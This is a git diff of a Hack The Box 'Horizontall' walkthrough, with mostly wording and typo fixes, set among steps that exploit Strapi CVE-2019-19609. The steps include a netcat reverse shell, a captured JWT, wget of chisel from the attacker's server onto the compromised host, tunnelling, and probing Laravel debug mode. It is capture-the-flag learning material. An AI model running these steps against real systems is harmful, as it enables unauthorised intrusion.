@@ -250,7 +250,7 @@ if __name__ == ("__main__"):
     terminal.cmdloop()
 ``````
 
-We see the exloit first determines the version by making a GET request to */admin/init*. We can do the check manually and finally get the version!
+We see the exploit first determines the version by making a GET request to */admin/init*. We can do the check manually and finally get the version!
 
 <div class="img_container">
 ![strapi version]({{https://jsom1.github.io/}}/_images/htb_hor_version.png)
@@ -307,7 +307,8 @@ print(r)
 print(r.text)
 ``````
 
-We see the payload is a netcat reverse shell, so that could do the work! We have to give 4 parameters to the script: the domain, the Json web token (jwt), the local host and a port. Note that the previous exploit gave us our jwt: mine is *eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQxMjEzNTI5LCJleHAiOjE2NDM4MDU1Mjl9.jeVXS_lQg1st2cVd7qC4axDulCR8gFyb0FdNOH-mFyM*. So, let's download this script into */results/10.10.11.105/exploit* and try it:
+We see the payload is a netcat reverse shell, so that could do the work! We have to give 4 parameters to the script: the domain, the Json web token (jwt), the local host and a port. Note that the previous exploit gave us our jwt: mine is *eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQxMjEzNTI5LCJleHAiOjE2NDM4M\\
+DU1Mjl9.jeVXS_lQg1st2cVd7qC4axDulCR8gFyb0FdNOH-mFyM*. So, let's download this script into */results/10.10.11.105/exploit* and try it:
 
 ````
 sudo git clone https://github.com/diego-tella/CVE-2019-19609-EXPLOIT
@@ -336,7 +337,7 @@ Note that we first have a simple reverse shell, so we can use the following comm
 python -c 'import pty;pty.spawn("/bin/bash");'
 `````
 
-The first thing I did was to check the users and see if we can already get the flag or if we will have to go through horizontal privesc. It turns out it's not the case!
+The first thing I did was to check the users and see if we can already get the flag or if we will have to go through horizontal privesc. It turns out it's not the case:
 
 <div class="img_container">
 ![user flag]({{https://jsom1.github.io/}}/_images/htb_hor_user.png)
@@ -365,7 +366,7 @@ I tried with a few different usernames and passwords, to no avail... We have to 
 curl 127.0.0.1:8000
 `````
 
-The output is lengthy and messy, but there are a lot of references to laravel (*"Laravel is a web application framework with expressive, elegant syntax"*). In the last box I did (<a href="/_walkthroughs/Devzat">Devzat</a>), I used a tool for the first time called *chisel* to access a database that was running in a container on the compromised host. For the sake of the exercise, let's try to use it again here to display the page on the host.\\
+The output is lengthy and messy, but there are a lot of references to laravel (*"Laravel is a web application framework with expressive, elegant syntax"*). In the last box I did (<a href="/_walkthroughs/Devzat">Devzat</a>), I used a tool for the first time called *chisel* to access a database that was running in a container on the compromised host. For the sake of the exercise, let's try to use it again here to display the page in our own browser.\\
 First, we have to upload *chisel* on the compromised host. To do so, we start a python web server on Kali (*sudo python -m SimpleHTTPServer* in the directory in which we have *chisel*), and *wget* (*wget http://10.10.14.9:8000/chisel*) it from *strapi*. On *strapi*, I created a *.tmp* directory in */tmp* to download it. Finally, we make it executable with *chmod +x chisel*.
 
 Then, we run the following command on Kali:
@@ -386,7 +387,7 @@ Note that the syntax for the last command is *./chisel client [kali_IP]:[kali_po
 </div>
 
 I find it awesome and way easier to read than the output we got by using *wget*. In a glance, we see Laravel v8. There are a few results with *searchsploit*, but the version isn't mentionned. Let's look on the internet instead. By searching "laravel v8 exploit", we see a lot of results and RCEs. I read somewhere that "*If Laravel is in debugging mode you will be able to access the code and sensitive data. For example http://127.0.0.1:8000/profiles*".\\
-We can try in our browser, and indeed we see the same thing:
+We can try in our browser, and indeed it seems to be in debugging mode:
 
 <div class="img_container">
 ![debug]({{https://jsom1.github.io/}}/_images/htb_hor_debug.png)
